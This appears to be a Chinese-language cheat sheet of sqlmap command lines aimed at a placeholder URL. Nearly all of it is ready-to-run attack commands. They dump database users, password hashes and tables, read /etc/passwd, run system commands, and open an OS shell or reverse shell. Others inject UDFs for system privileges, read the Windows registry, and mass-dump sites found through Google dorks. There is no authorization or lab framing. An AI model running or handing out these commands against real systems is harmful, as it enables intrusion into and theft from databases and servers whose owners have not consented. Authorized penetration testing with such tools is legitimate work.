[sqlmap 中文指南](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md)


[sqlmap useage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)


```bash
# 测试借口
sqlmap -u   [url]  
```

sql参数
|参数|含义|
|---|---|
|--dbs|可用数据库|
|--current-db|当前数据库|
|--current-user|当前用户|
|--users|列出所有用户|
|--passwords|数据库账户和密码|
|-D|指定数据库名称|
|--tables|列出表|
|--columns|检出列|
|-T|指定数据表|
|-C|表字段内容|
|--dump|导出|
|-start 1 |起点|
|--stop |最后的数据|
|--os-shell||
|--file-read||
----
参考
* [sqlmap 简单快速实践](http://blog.csdn.net/zgyulongfei/article/details/41017493)


常用
|命令|含义|
|---|---|
|python sqlmap/sqlmap.py -u "http://url/news?id=1"  --smart  --level 3 --users  |# smart智能 level  执行测试等级
|python sqlmap/sqlmap.py -u "http://url/news?id=1"  --dbms "Mysql" --users  |# dbms 指定数据库类型
|python sqlmap/sqlmap.py -u "http://url/news?id=1"    --users  |#列数据库用户
|python sqlmap/sqlmap.py -u "http://url/news?id=1"    --dbs|#列数据库 
|python sqlmap/sqlmap.py -u "http://url/news?id=1"   --passwords |#数据库用户密码 
|python sqlmap/sqlmap.py -u "http://url/news?id=1"   --passwords-U root  -v 0 |#列出指定用户数据库密码
|python sqlmap/sqlmap.py -u "http://url/news?id=1"     --dump -C "password,user,id" -T "tablename" -D "db_name" --start 1 --stop 20  |#列出指定字段，列出20条 
 |python sqlmap/sqlmap.py -u "http://url/news?id=1"    --dump-all -v 0 |#列出所有数据库所有表
|python sqlmap/sqlmap.py -u "http://url/news?id=1"   --privileges |#查看权限 
|python sqlmap/sqlmap.py -u "http://url/news?id=1"   --privileges -U root| #查看指定用户权限
|python sqlmap/sqlmap.py -u "http://url/news?id=1"    --is-dba -v 1| #是否是数据库管理员
|python sqlmap/sqlmap.py -u "http://url/news?id=1"    --roles |#枚举数据库用户角色 
|python sqlmap/sqlmap.py -u "http://url/news?id=1"   --udf-inject |#导入用户自定义函数（获取系统权限！）
|python sqlmap/sqlmap.py -u "http://url/news?id=1"   --dump-all --exclude-sysdbs -v 0| #列出当前库所有表
|python sqlmap/sqlmap.py -u "http://url/news?id=1"   --union-cols #union| 查询表记录 
|python sqlmap/sqlmap.py -u "http://url/news?id=1"   --cookie "COOKIE_VALUE" |#cookie注入
|python sqlmap/sqlmap.py -u "http://url/news?id=1"   -b |#获取banner信息
|python sqlmap/sqlmap.py -u "http://url/news?id=1" --data "id=3"  |#post注入
|python sqlmap/sqlmap.py -u "http://url/news?id=1"  -v 1 -f |#指纹判别数据库类型 
|python sqlmap/sqlmap.py -u "http://url/news?id=1"  --proxy"http://127.0.0.1:8118" |#代理注入
|python sqlmap/sqlmap.py -u "http://url/news?id=1"--string"STRING_ON_TRUE_PAGE" | #指定关键词
|python sqlmap/sqlmap.py -u "http://url/news?id=1"   --sql-shell |#执行指定sql命令
|python sqlmap/sqlmap.py -u "http://url/news?id=1"   --file /etc/passwd 
|python sqlmap/sqlmap.py -u "http://url/news?id=1"   --os-cmd=whoami |#执行系统命令
|python sqlmap/sqlmap.py -u "http://url/news?id=1"   --os-shell| #系统交互shell
|python sqlmap/sqlmap.py -u "http://url/news?id=1"   --os-pwn |#反弹shell 
|python sqlmap/sqlmap.py -u "http://url/news?id=1"   --reg-read| #读取win系统注册表
|python sqlmap/sqlmap.py -u "http://url/news?id=1"    --dbs-o "sqlmap.log"| #保存进度 
|python sqlmap/sqlmap.py -u "http://url/news?id=1"    --dbs  -o "sqlmap.log" --resume | #恢复已保存进度sqlmap -g "google语法" --dump-all --batch  #google搜索注入点自动 跑出所有字段攻击实例
python sqlmap/sqlmap.py -u "http://url/news?id=1&Submit=Submit" --cookie="PHPSESSID=41aa833e6d0d28f489ff1ab5a7531406" --string="Surname" --dbms=mysql --users --password